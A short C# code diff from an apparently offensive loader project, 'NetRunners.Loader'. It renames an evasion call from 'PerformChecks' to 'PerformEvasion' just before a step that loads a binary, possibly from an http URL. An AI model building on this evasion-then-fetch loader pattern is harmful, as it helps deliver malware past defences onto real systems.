@@ -43,7 +43,7 @@ namespace NetRunners.Loader
                 }
 
                 // evasion
-                NetRunners.Helpers.Helper.PerformChecks();
+                NetRunners.Helpers.Helper.PerformEvasion();
 
                 // get binary
                 byte[] binaryData = (o.path).StartsWith("http", StringComparison.OrdinalIgnoreCase)
@@ -87,7 +87,7 @@ namespace NetRunners.Loader
             }
 
             // evasion
-            NetRunners.Helpers.Helper.PerformChecks();
+            NetRunners.Helpers.Helper.PerformEvasion();
 
             // get binary
             byte[] binaryData = (path).StartsWith("http", StringComparison.OrdinalIgnoreCase)
